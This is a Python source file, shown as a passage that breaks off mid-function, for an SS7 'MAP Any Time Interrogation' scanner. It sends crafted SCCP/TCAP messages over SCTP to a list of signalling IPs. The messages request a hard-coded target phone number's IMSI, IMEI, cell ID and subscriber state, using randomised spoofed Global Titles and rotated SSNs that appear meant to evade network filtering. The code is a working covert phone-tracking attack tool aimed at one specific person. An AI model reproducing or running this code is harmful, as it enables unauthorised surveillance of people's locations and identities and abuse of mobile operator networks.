#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Enhanced MAP-ATI Scanner v5.2 - Professional Edition - Fixed Transmission
=======================================================================

Fixed MAP Any Time Interrogation scanner with proper data transmission
and complete Pycrate integration with elegant terminal output.

Author: Enhanced Professional Edition for donex1888
Date: 2025-06-04
Version: 5.2.0-PROFESSIONAL-FIXED-TRANSMISSION
Current Date and Time (UTC): 2025-06-04 02:35:37
Current User's Login: donex1888
"""

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime, timezone
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any
from contextlib import contextmanager
from copy import deepcopy
import re
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import traceback
import csv

# === Enhanced Color Terminal Output ===
class Colors:
    """Professional ANSI Color codes for elegant terminal output"""
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    
    # Standard colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, 
                 bg: str = None, italic: bool = False, underline: bool = False):
    """Print colored message to terminal with advanced formatting"""
    output = ""
    if bold:
        output += Colors.BOLD
    if italic:
        output += Colors.ITALIC
    if underline:
        output += Colors.UNDERLINE
    if bg:
        output += bg
    output += color + message + Colors.RESET
    print(output)

def print_elegant_box(title: str, content: List[str], border_color: str = Colors.CYAN, 
                     title_color: str = Colors.BRIGHT_WHITE, content_color: str = Colors.WHITE):
    """Print content in an elegant box with borders"""
    max_width = max(len(title) + 4, max(len(line) for line in content) + 4, 50)
    
    # Top border
    print_colored("┌" + "─" * (max_width - 2) + "┐", border_color)
    
    # Title
    title_padding = (max_width - len(title) - 4) // 2
    title_line = f"│ {' ' * title_padding}{title}{' ' * (max_width - len(title) - 4 - title_padding)} │"
    print_colored(title_line, title_color, bold=True)
    
    # Separator
    print_colored("├" + "─" * (max_width - 2) + "┤", border_color)
    
    # Content
    for line in content:
        content_padding = max_width - len(line) - 4
        content_line = f"│ {line}{' ' * content_padding} │"
        print_colored(content_line, content_color)
    
    # Bottom border
    print_colored("└" + "─" * (max_width - 2) + "┘", border_color)

def print_professional_banner():
    """Print enhanced professional banner in elegant box"""
    banner_content = [
        f"🚀 Enhanced MAP-ATI Scanner v5.2 - Professional Edition",
        f"📅 Current Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC",
        f"👤 User: donex1888",
        f"🔧 Professional Edition with Fixed Transmission",
        f"✨ Complete Pycrate Integration & Elegant Output"
    ]
    
    print_elegant_box("MAP-ATI SCANNER PROFESSIONAL v5.2", banner_content, 
                     Colors.BRIGHT_CYAN, Colors.BRIGHT_GREEN, Colors.WHITE)

# === Professional Dependency Management ===
def initialize_professional_dependencies():
    """Professional dependency initialization with enhanced error handling"""
    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW, bold=True)
    
    dependencies = {}
    
    # Essential SCTP
    try:
        import sctp
        dependencies['sctp'] = sctp
        print_colored("✅ SCTP library loaded successfully", Colors.GREEN)
    except ImportError:
        print_colored("❌ CRITICAL: 'sctp' library not found. Install with: pip install pysctp", Colors.RED, bold=True)
        sys.exit(1)

    # Hexdump for debugging
    try:
        import hexdump
        dependencies['hexdump'] = hexdump
        print_colored("✅ Hexdump library loaded", Colors.GREEN)
    except ImportError:
        dependencies['hexdump'] = None
        print_colored("⚠️  Warning: hexdump not found. Basic hex output will be used.", Colors.YELLOW)

    return dependencies

def initialize_pycrate_and_files():
    """Initialize Pycrate and load required files with fallback mechanisms"""
    print_colored("🔧 Initializing Pycrate with fallback mechanisms...", Colors.YELLOW, bold=True)
    
    pycrate_modules = {}
    
    try:
        # Core ASN.1 Runtime - Essential
        from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj, BOOL
        from pycrate_asn1rt.asnobj_str import OCT_STR, BIT_STR
        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF, SET
        from pycrate_asn1rt.codecs import ASN1CodecBER
        print_colored("✅ Pycrate ASN.1 runtime loaded", Colors.GREEN)
        
        pycrate_modules.update({
            'ASN1Err': ASN1Err,
            'ASN1ObjErr': ASN1ObjErr,
            'ASN1CodecBER': ASN1CodecBER,
            'OCT_STR': OCT_STR,
            'BIT_STR': BIT_STR,
            'SEQ': SEQ,
            'CHOICE': CHOICE,
            'SET': SET,
            'INT': INT,
            'NULL': NULL,
            'BOOL': BOOL
        })
        
    except ImportError as e:
        print_colored(f"❌ Failed to load core Pycrate modules: {e}", Colors.RED, bold=True)
        sys.exit(1)
    
    # Try to load local files first
    local_sccp = None
    try:
        from pycrate_mobile import SCCP
        local_sccp = SCCP
        print_colored("✅ Local SCCP module loaded successfully", Colors.GREEN)
    except ImportError:
        print_colored("⚠️  Local SCCP module not found, using manual construction", Colors.YELLOW)
    
    # Load MAP Application Context if available
    map_app_ctx = None
    try:
        from pycrate_mobile import TS29002_MAPAppCtx
        map_app_ctx = TS29002_MAPAppCtx
        print_colored("✅ MAP Application Context loaded", Colors.GREEN)
    except ImportError:
        print_colored("⚠️  MAP Application Context not found, using fallback", Colors.YELLOW)
    
    # Load MAP IE if available
    map_ie = None
    try:
        from pycrate_mobile import TS29002_MAPIE
        map_ie = TS29002_MAPIE
        print_colored("✅ MAP Information Elements loaded", Colors.GREEN)
    except ImportError:
        print_colored("⚠️  MAP Information Elements not found, using fallback", Colors.YELLOW)
    
    # Try to load MAP data types
    map_defs = None
    try:
        from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_module
        if hasattr(MAP_module, 'MAP_MS_DataTypes'):
            map_defs = MAP_module
            print_colored("✅ MAP data types loaded from TCAP_MAPv2v3", Colors.GREEN)
    except ImportError:
        try:
            from pycrate_mobile import MAP as MAP_fallback
            if hasattr(MAP_fallback, 'MAP_MS_DataTypes'):
                map_defs = MAP_fallback
                print_colored("✅ MAP data types loaded from pycrate_mobile.MAP", Colors.GREEN)
        except ImportError:
            print_colored("⚠️  MAP data types not found, using manual construction", Colors.YELLOW)
    
    # TCAP Definitions
    tcap_defs = None
    try:
        import importlib.util
        tcap_spec = importlib.util.spec_from_file_location("TCAP2", "TCAP2.py")
        if tcap_spec and tcap_spec.loader:
            TCAP2 = importlib.util.module_from_spec(tcap_spec)
            tcap_spec.loader.exec_module(TCAP2)
            if hasattr(TCAP2, 'TCAPMessages'):
                tcap_defs = TCAP2.TCAPMessages
                print_colored("✅ TCAP definitions loaded from TCAP2.py", Colors.GREEN)
    except Exception:
        try:
            from pycrate_asn1dir import TCAP_defs as TCAP_module
            if hasattr(TCAP_module, 'TCMessage'):
                tcap_defs = TCAP_module
                print_colored("✅ TCAP definitions loaded from TCAP_defs", Colors.GREEN)
        except ImportError:
            print_colored("⚠️  TCAP definitions not found, using manual construction", Colors.YELLOW)
    
    pycrate_modules.update({
        'SCCP': local_sccp,
        'MAP_defs': map_defs,
        'TCAP_defs': tcap_defs,
        'MAPAppCtx': map_app_ctx,
        'MAPIE': map_ie
    })
    
    print_colored("✅ Pycrate initialization completed with fallback support", Colors.BRIGHT_GREEN, bold=True)
    return pycrate_modules

# Initialize dependencies
DEPS = initialize_professional_dependencies()
PYCRATE = initialize_pycrate_and_files()

# === Enhanced Data Classes ===
class AtiVariant(Enum):
    STANDARD = "Standard"
    LOCATION_ONLY = "LocationOnly"
    SUBSCRIBER_STATE = "SubscriberState"
    EQUIPMENT_STATUS = "EquipmentStatus"
    ALL_INFO = "AllInfo"
    MINIMAL = "Minimal"

@dataclass
class EnhancedLocationInfo:
    """Comprehensive location information container"""
    mcc: str = "N/A"
    mnc: str = "N/A"
    lac: str = "N/A"
    cell_id: str = "N/A"
    vlr_name: str = "N/A"
    msc_name: str = "N/A"
    sgsn_name: str = "N/A"
    location_age: str = "N/A"
    geographical_info: str = "N/A"
    location_number: str = "N/A"
    cgi_found: bool = False
    lai_found: bool = False

@dataclass
class EnhancedSubscriberInfo:
    """Comprehensive subscriber information container"""
    imsi: str = "N/A"
    msisdn: str = "N/A"
    imei: str = "N/A"
    subscriber_state: str = "N/A"
    equipment_status: str = "N/A"
    supported_features: List[str] = None
    
    def __post_init__(self):
        if self.supported_features is None:
            self.supported_features = []

@dataclass
class ScanResult:
    """Professional scan result container with enhanced details"""
    ip: str = ""
    port: int = 0
    timestamp: str = ""
    duration_ms: float = 0.0
    success: bool = False
    tcap_outcome: str = "NotStarted"
    error_info: str = "N/A"
    error_code: Optional[int] = None
    rejection_cause: str = "N/A"
    map_version: str = "N/A"
    sent_otid: str = ""
    received_dtid: str = "N/A"
    ati_variant_used: str = ""
    attempt_number: int = 1
    location_info: EnhancedLocationInfo = None
    subscriber_info: EnhancedSubscriberInfo = None
    used_cgpa_ssn: int = 0
    used_cgpa_gt: str = ""
    raw_response_hex: str = ""
    connection_time_ms: float = 0.0
    response_time_ms: float = 0.0
    bytes_sent: int = 0
    bytes_received: int = 0
    
    def __post_init__(self):
        if self.location_info is None:
            self.location_info = EnhancedLocationInfo()
        if self.subscriber_info is None:
            self.subscriber_info = EnhancedSubscriberInfo()

# === Professional Constants ===
MAP_OP_ANY_TIME_INTERROGATION = 71

PROFESSIONAL_CONFIG = {
    'target_msisdn': "212681364829",
    'ips_file': "ips.txt",
    'results_dir': "professional_results_v52",
    'max_workers': 30,
    'sctp_timeout': 15,
    'sctp_ppid': 0,
    'sctp_ports': [2905, 2906, 2907, 2908, 2909, 2910],
    'retry_attempts': 3,
    'retry_delay': 2.5,
    'gt_pool_size': 1000,
    'connection_timeout': 8,
    'response_timeout': 12
}

SCCP_PROFESSIONAL = {
    'cdpa_ssn': 149,
    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156],
    'cgpa_gt_digits': "212600000000",
    'sccp_proto_class_pool': [0, 1]
}

# Enhanced TCAP Tags
TCAP_TAGS = {
    'MSG_BEGIN': 0x60,
    'MSG_END': 0x65,
    'MSG_CONTINUE': 0x64,
    'MSG_ABORT': 0x67,
    'OTID': 0x49,
    'DTID': 0x48,
    'DIALOGUE_PORTION': 0x6B,
    'COMPONENT_PORTION': 0x6C,
    'COMP_INVOKE': 0xA1,
    'COMP_RETURN_RESULT_LAST': 0xA2,
    'COMP_RETURN_ERROR': 0xA3,
    'COMP_REJECT': 0xA4
}

# MAP Error Codes
MAP_ERRORS = {
    1: "Unknown Subscriber",
    3: "Unknown MSC",
    5: "Unidentified Subscriber",
    6: "Absent Subscriber SM",
    8: "Unknown Equipment",
    9: "Roaming Not Allowed",
    10: "Illegal Subscriber",
    11: "Bearer Service Not Provisioned",
    12: "Teleservice Not Provisioned",
    13: "Illegal Equipment",
    21: "Facility Not Supported",
    27: "Absent Subscriber",
    28: "Incompatible Terminal",
    29: "Not Reachable",
    34: "System Failure",
    35: "Data Missing",
    36: "Unexpected Data Value",
    37: "Facility Not Supported",
    49: "ATI Not Allowed",
    52: "Information Not Available",
    53: "Unauthorized Requesting Network"
}

# Professional Statistics
PROFESSIONAL_STATS = {
    'total_attempts': 0,
    'successful_responses': 0,
    'full_info_extractions': 0,
    'imsi_extractions': 0,
    'location_extractions': 0,
    'timeouts': 0,
    'connection_errors': 0,
    'map_errors': 0,
    'tcap_rejects': 0,
    'tcap_aborts': 0,
    'start_time': None,
    'error_breakdown': defaultdict(int),
    'success_rate': 0.0,
    'fastest_response': float('inf'),
    'slowest_response': 0.0
}

# Threading locks
main_csv_lock = threading.Lock()
stats_lock = threading.Lock()
terminal_lock = threading.Lock()
logger = None

# === Professional GT Pool Management ===
class ProfessionalGTPool:
    """Professional Global Title Pool with intelligent distribution"""
    
    def __init__(self, base_gt: str, pool_size: int = 1000):
        self.base_gt = base_gt
        self.pool_size = pool_size
        self.gt_pool = []
        self.current_index = 0
        self.lock = threading.Lock()
        self._generate_professional_pool()
        print_colored(f"✅ Professional GT Pool initialized with {pool_size} entries", Colors.GREEN)
    
    def _generate_professional_pool(self):
        """Generate professional GT pool with enhanced randomization"""
        base_digits = re.sub(r'[^\d]', '', self.base_gt)
        
        for i in range(self.pool_size):
            timestamp_part = str(int(time.time() * 1000000))[-8:]
            random_part = f"{random.randint(10000000, 99999999)}"
            sequence_part = f"{i:06d}"
            
            full_gt = base_digits + timestamp_part + random_part + sequence_part
            
            if len(full_gt) > 15:
                full_gt = full_gt[-15:]
            elif len(full_gt) < 11:
                full_gt = full_gt.ljust(11, '0')
            
            self.gt_pool.append(full_gt)
    
    def get_next_gt(self) -> str:
        """Get next GT with intelligent distribution"""
        with self.lock:
            gt = self.gt_pool[self.current_index]
            self.current_index = (self.current_index + 1) % self.pool_size
            return gt

# Initialize Professional GT Pool
gt_pool = None

# === Professional Utility Functions ===

def setup_professional_logging(log_file: Path, log_level: str = "INFO") -> logging.Logger:
    """Setup professional logging with enhanced formatting"""
    logger = logging.getLogger("professional_map_scanner_v52")
    logger.handlers.clear()
    logger.setLevel(logging.DEBUG)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)
    console_handler.setLevel(getattr(logging, log_level.upper()))
    logger.addHandler(console_handler)
    
    # Professional file handler
    file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    file_formatter = logging.Formatter(
        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-12s]-%(funcName)-20s:%(lineno)-4d-%(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    file_handler.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    
    return logger

def decode_plmn_professional(plmn_bytes: bytes) -> Tuple[str, str]:
    """Professional PLMN decoder with comprehensive validation"""
    if len(plmn_bytes) != 3:
        raise ValueError(f"PLMN must be exactly 3 bytes, got {len(plmn_bytes)}")
    
    byte1, byte2, byte3 = plmn_bytes
    
    mcc_digit1 = (byte1 >> 4) & 0x0F
    mcc_digit2 = byte1 & 0x0F
    mcc_digit3 = (byte2 >> 4) & 0x0F
    
    mnc_digit1 = (byte3 >> 4) & 0x0F
    mnc_digit2 = byte3 & 0x0F
    mnc_digit3 = byte2 & 0x0F
    
    if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
        raise ValueError(f"Invalid MCC digits")
    
    mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
    
    if mnc_digit3 == 0xF:
        if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
            raise ValueError(f"Invalid 2-digit MNC")
        mnc = f"{mnc_digit1}{mnc_digit2}"
    else:
        if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
            raise ValueError(f"Invalid 3-digit MNC")
        mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
    
    return mcc, mnc

def decode_tbcd_string(tbcd_bytes: bytes) -> str:
    """Professional TBCD string decoder"""
    if not tbcd_bytes:
        return "N/A"
    
    digits = []
    for byte in tbcd_bytes:
        digit1 = byte & 0x0F
        digit2 = (byte >> 4) & 0x0F
        
        if digit1 <= 9:
            digits.append(str(digit1))
        if digit2 <= 9 and digit2 != 0xF:
            digits.append(str(digit2))
    
    return ''.join(digits) if digits else "N/A"

def print_connection_status(ip: str, port: int, status: str, details: str = "", 
                          color: str = Colors.WHITE, unique_id: str = ""):
    """Print elegant connection status in organized format"""
    with terminal_lock:
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        status_icons = {
            "CONNECTING": ("🔄", Colors.BLUE),
            "CONNECTED": ("✅", Colors.GREEN),
            "BUILDING": ("🔨", Colors.CYAN),
            "SENDING": ("📤", Colors.CYAN),
            "RECEIVING": ("📥", Colors.MAGENTA),
            "SUCCESS": ("🎯", Colors.BRIGHT_GREEN),
            "PARTIAL_SUCCESS": ("⚡", Colors.YELLOW),
            "ERROR": ("❌", Colors.RED),
            "TIMEOUT": ("⏰", Colors.YELLOW),
            "REJECTED": ("🚫", Colors.RED),
            "FAILED": ("💥", Colors.BRIGHT_RED),
            "PARSING": ("🔍", Colors.BLUE)
        }
        
        icon, status_color = status_icons.get(status, ("ℹ️", color))
        
        # Create elegant status line with IP coloring
        ip_colored = f"\033[96m{ip}\033[0m"  # Cyan IP
        port_colored = f"\033[93m{port}\033[0m"  # Yellow port
        
        status_line = f"{timestamp} [{unique_id}] {icon} {ip_colored}:{port_colored}"
        if details:
            status_line += f" - {details}"
        
        print_colored(status_line, status_color, bold=(status in ["SUCCESS", "FAILED", "ERROR"]))

# === Fixed SCCP Message Construction ===

def build_fixed_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
    """Build reliable SCCP UDT message with guaranteed data transmission"""
    
    if not tcap_data or len(tcap_data) == 0:
        raise ValueError("TCAP data cannot be empty")
    
    print_colored(f"🔧 Building reliable SCCP message: CDPA={cdpa_gt}, CGPA={cgpa_gt}, TCAP={len(tcap_data)}b", Colors.CYAN)
    
    try:
        # Use Pycrate if available
        if PYCRATE['SCCP'] is not None:
            return build_pycrate_sccp_message(cdpa_gt, cgpa_gt, tcap_data, sccp_config)
    except Exception as e:
        print_colored(f"⚠️  Pycrate SCCP failed: {e}, using manual construction", Colors.YELLOW)
    
    # Reliable manual construction
    return build_manual_sccp_message_fixed(cdpa_gt, cgpa_gt, tcap_data, sccp_config)

def build_pycrate_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
    """Build SCCP message using Pycrate with proper error handling"""
    
    sccp_udt = PYCRATE['SCCP'].SCCPUnitData()
    
    # Set protocol class
    proto_class = random.choice(sccp_config.get('sccp_proto_class_pool', [0]))
    sccp_udt['ProtocolClass']['Class'].set_val(proto_class)
    sccp_udt['ProtocolClass']['Handling'].set_val(0)
    
    # Called Party Address (CDPA)
    cdpa = sccp_udt['CalledPartyAddr']['Value']
    cdpa['AddrInd']['RoutingInd'].set_val(0)  # Route on GT
    cdpa['AddrInd']['GTInd'].set_val(4)  # GT includes TT, NP, ES, NAI
    cdpa['AddrInd']['SSNInd'].set_val(1)  # SSN present
    cdpa['AddrInd']['PCInd'].set_val(0)  # PC not present
    
    cdpa['SSN'].set_val(sccp_config['cdpa_ssn'])
    
    # Set Global Title for CDPA
    gt_cdpa = cdpa['GT']
    gt_cdpa['TranslationType'].set_val(0)
    gt_cdpa['NumberingPlan'].set_val(1)
    gt_cdpa['EncodingScheme'].set_val(2)  # BCD, even number of digits
    gt_cdpa['NAI'].set_val(4)  # International number
    
    # Manual BCD encoding for GT
    if hasattr(gt_cdpa['Addr'], 'set_addr_bcd'):
        gt_cdpa['Addr'].set_addr_bcd(cdpa_gt)
    else:
        gt_cdpa['Addr']['BCD'].encode(cdpa_gt)
    
    # Calling Party Address (CGPA)
    cgpa = sccp_udt['CallingPartyAddr']['Value']
    cgpa['AddrInd']['RoutingInd'].set_val(0)
    cgpa['AddrInd']['GTInd'].set_val(4)
    cgpa['AddrInd']['SSNInd'].set_val(1)
    cgpa['AddrInd']['PCInd'].set_val(0)
    
    cgpa['SSN'].set_val(sccp_config['cgpa_ssn'])
    
    # Set Global Title for CGPA
    gt_cgpa = cgpa['GT']
    gt_cgpa['TranslationType'].set_val(0)
    gt_cgpa['NumberingPlan'].set_val(1)
    gt_cgpa['EncodingScheme'].set_val(2)
    gt_cgpa['NAI'].set_val(4)
    
    if hasattr(gt_cgpa['Addr'], 'set_addr_bcd'):
        gt_cgpa['Addr'].set_addr_bcd(cgpa_gt)
    else:
        gt_cgpa['Addr']['BCD'].encode(cgpa_gt)
    
    # Data
    sccp_udt['Data']['Value'].set_val(tcap_data)
    
    result = sccp_udt.to_bytes()
    
    if len(result) == 0:
        raise ValueError("Pycrate generated empty SCCP message")
    
    print_colored(f"✅ Pycrate SCCP message built: {len(result)} bytes", Colors.GREEN)
    return result

def build_manual_sccp_message_fixed(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
    """Build SCCP UDT message manually with guaranteed reliability"""
    
    print_colored(f"🔧 Manual SCCP construction: CDPA={cdpa_gt}, CGPA={cgpa_gt}", Colors.CYAN)
    
    sccp_msg = bytearray()
    
    # Message type - UDT
    sccp_msg.append(0x09)
    
    # Protocol class
    proto_class = random.choice(sccp_config.get('sccp_proto_class_pool', [0]))
    sccp_msg.append(proto_class)
    
    # Encode Global Titles as ASCII
    cdpa_gt_bytes = cdpa_gt.encode('ascii')
    cgpa_gt_bytes = cgpa_gt.encode('ascii')
    
    # Calculate lengths
    cdpa_len = 6 + len(cdpa_gt_bytes)  # AI + SSN + GTI + TT + NP+NAI + ES + GT
    cgpa_len = 6 + len(cgpa_gt_bytes)
    
    # Pointers
    sccp_msg.append(0x03)  # Pointer to CDPA (fixed)
    sccp_msg.append(0x03 + cdpa_len)  # Pointer to CGPA
    sccp_msg.append(0x03 + cdpa_len + cgpa_len)  # Pointer to Data
    
    # Called Party Address (CDPA)
    sccp_msg.append(cdpa_len - 1)  # Length (excluding length byte)
    sccp_msg.append(0x43)  # Address indicator: GT + SSN
    sccp_msg.append(sccp_config['cdpa_ssn'])  # SSN
    sccp_msg.append(0x12)  # Global Title Indicator 4
    sccp_msg.append(0x00)  # Translation Type
    sccp_msg.append((1 << 4) | 4)  # NumberingPlan=1, NAI=4
    sccp_msg.append(0x02)  # Encoding Scheme=2 (BCD even)
    sccp_msg.extend(cdpa_gt_bytes)
    
    # Calling Party Address (CGPA)
    sccp_msg.append(cgpa_len - 1)  # Length
    sccp_msg.append(0x43)  # Address indicator: GT + SSN
    sccp_msg.append(sccp_config['cgpa_ssn'])  # SSN
    sccp_msg.append(0x12)  # Global Title Indicator 4
    sccp_msg.append(0x00)  # Translation Type
    sccp_msg.append((1 << 4) | 4)  # NumberingPlan=1, NAI=4
    sccp_msg.append(0x02)  # Encoding Scheme=2
    sccp_msg.extend(cgpa_gt_bytes)
    
    # Data portion
    sccp_msg.append(len(tcap_data))  # Data length
    sccp_msg.extend(tcap_data)
    
    result = bytes(sccp_msg)
    
    if len(result) == 0:
        raise ValueError("Manual SCCP construction resulted in empty message")
    
    print_colored(f"✅ Manual SCCP message built: {len(result)} bytes", Colors.GREEN)
    
    if logger:
        logger.debug(f"Manual SCCP hex: {result.hex()}")
    
    return result

# === Enhanced TCAP Message Construction ===

def build_professional_tcap_message(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build professional TCAP message with reliable construction"""
    
    print_colored(f"🔧 Building TCAP message: variant={ati_variant.value}, MSISDN={target_msisdn}", Colors.CYAN)
    
    try:
        # Try Pycrate first if available
        if PYCRATE['TCAP_defs'] is not None:
            return build_pycrate_tcap_message(otid, ati_variant, target_msisdn)
    except Exception as e:
        print_colored(f"⚠️  Pycrate TCAP failed: {e}, using manual construction", Colors.YELLOW)
    
    # Reliable manual construction
    return build_manual_tcap_message_fixed(otid, ati_variant, target_msisdn)

def build_pycrate_tcap_message(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build TCAP message using Pycrate"""
    
    TCMessage = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
    
    # Build ATI parameter
    ati_param = build_ati_parameter_professional(ati_variant, target_msisdn)
    
    # Build the message structure
    tcap_msg = {
        'begin': {
            'otid': otid,
            'dialoguePortion': {
                'version1': {
                    'oid': [0, 4, 0, 0, 1, 0, 5, 3],  # MAP v3 Application Context
                    'asn1-xstring': None
                }
            },
            'components': [{
                'invoke': {
                    'invokeId': 1,
                    'opcode': {'localValue': MAP_OP_ANY_TIME_INTERROGATION},
                    'parameter': ati_param
                }
            }]
        }
    }
    
    TCMessage.set_val(tcap_msg)
    result = TCMessage.to_ber()
    
    if len(result) == 0:
        raise ValueError("Pycrate generated empty TCAP message")
    
    print_colored(f"✅ Pycrate TCAP message built: {len(result)} bytes", Colors.GREEN)
    return result

def build_manual_tcap_message_fixed(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build TCAP message manually with guaranteed reliability"""
    
    tcap_msg = bytearray()
    
    # TCAP Begin
    tcap_msg.append(TCAP_TAGS['MSG_BEGIN'])
    
    # Placeholder for total length
    length_pos = len(tcap_msg)
    tcap_msg.append(0x00)
    
    # OTID
    tcap_msg.append(TCAP_TAGS['OTID'])
    tcap_msg.append(len(otid))
    tcap_msg.extend(otid)
    
    # Dialogue Portion
    dialogue = build_dialogue_portion_manual()
    tcap_msg.append(TCAP_TAGS['DIALOGUE_PORTION'])
    tcap_msg.append(len(dialogue))
    tcap_msg.extend(dialogue)
    
    # Component Portion
    component = build_component_portion_manual(ati_variant, target_msisdn)
    tcap_msg.append(TCAP_TAGS['COMPONENT_PORTION'])
    tcap_msg.append(len(component))
    tcap_msg.extend(component)
    
    # Update total length
    total_length = len(tcap_msg) - 2
    if total_length > 255:
        raise ValueError("TCAP message too long for single byte length")
    tcap_msg[length_pos] = total_length
    
    result = bytes(tcap_msg)
    
    if len(result) == 0:
        raise ValueError("Manual TCAP construction resulted in empty message")
    
    print_colored(f"✅ Manual TCAP message built: {len(result)} bytes", Colors.GREEN)
    
    if logger:
        logger.debug(f"Manual TCAP hex: {result.hex()}")
    
    return result

def build_dialogue_portion_manual() -> bytes:
    """Build dialogue portion manually"""
    dialogue = bytearray()
    
    # External tag
    dialogue.append(0x28)
    
    # Length placeholder
    length_pos = len(dialogue)
    dialogue.append(0x00)
    
    # Object Identifier for MAP v3
    dialogue.extend([
        0x06, 0x08,  # OID tag and length
        0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03  # MAP v3 Application Context
    ])
    
    # Single-ASN.1-type
    dialogue.extend([
        0xA0, 0x03,  # [0] IMPLICIT
        0x02, 0x01, 0x00  # INTEGER 0 (MAP version)
    ])
    
    # Update length
    dialogue[length_pos] = len(dialogue) - 2
    
    return bytes(dialogue)

def build_component_portion_manual(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build component portion manually"""
    component = bytearray()
    
    # Invoke component
    component.append(TCAP_TAGS['COMP_INVOKE'])
    
    # Length placeholder
    length_pos = len(component)
    component.append(0x00)
    
    # Invoke ID
    component.extend([0x02, 0x01, 0x01])  # INTEGER 1
    
    # Operation Code
    component.extend([0x02, 0x01, MAP_OP_ANY_TIME_INTERROGATION])  # ATI operation
    
    # Parameter
    parameter = build_ati_parameter_manual(ati_variant, target_msisdn)
    component.extend(parameter)
    
    # Update length
    component[length_pos] = len(component) - 2
    
    return bytes(component)

def build_ati_parameter_professional(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build ATI parameter using Pycrate if available"""
    
    try:
        if PYCRATE['MAP_defs'] is not None:
            MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
            if MAP_MS_DataTypes:
                AtiArgType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationArg', None)
                if AtiArgType:
                    # Build using Pycrate
                    msisdn_bytes = encode_msisdn_professional(target_msisdn)
                    requested_info = build_requested_info_professional(ati_variant)
                    
                    ati_arg = deepcopy(AtiArgType)
                    arg_value = {
                        'subscriberIdentity': {
                            'msisdn': msisdn_bytes
                        },
                        'requestedInfo': requested_info
                    }
                    
                    ati_arg.set_val(arg_value)
                    result = ati_arg.to_ber()
                    
                    if len(result) > 0:
                        print_colored(f"✅ Pycrate ATI parameter built: {len(result)} bytes", Colors.GREEN)
                        return result
    except Exception as e:
        if logger:
            logger.debug(f"Pycrate ATI parameter failed: {e}")
    
    # Fallback to manual
    return build_ati_parameter_manual(ati_variant, target_msisdn)

def build_ati_parameter_manual(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
    """Build ATI parameter manually"""
    param = bytearray()
    
    # ATI parameter SEQUENCE
    param.append(0x30)  # SEQUENCE tag
    
    # Length placeholder
    length_pos = len(param)
    param.append(0x00)
    
    # Subscriber Identity
    msisdn_bytes = encode_msisdn_manual(target_msisdn)
    param.extend([
        0xA0, len(msisdn_bytes) + 2,  # [0] SubscriberIdentity
        0x81, len(msisdn_bytes)       # [1] MSISDN
    ])
    param.extend(msisdn_bytes)
    
    # Requested Info based on variant
    requested_info = build_requested_info_manual(ati_variant)
    param.extend(requested_info)
    
    # Update length
    param[length_pos] = len(param) - 2
    
    return bytes(param)

def build_requested_info_professional(ati_variant: AtiVariant) -> Dict:
    """Build requested info structure with proper NULL encoding"""
    
    NULL_VALUE = PYCRATE['NULL']() if PYCRATE['NULL'] else None
    
    if ati_variant == AtiVariant.LOCATION_ONLY:
        return {
            'locationInformation': NULL_VALUE,
            'subscriberState': NULL_VALUE
        }
    elif ati_variant == AtiVariant.SUBSCRIBER_STATE:
        return {
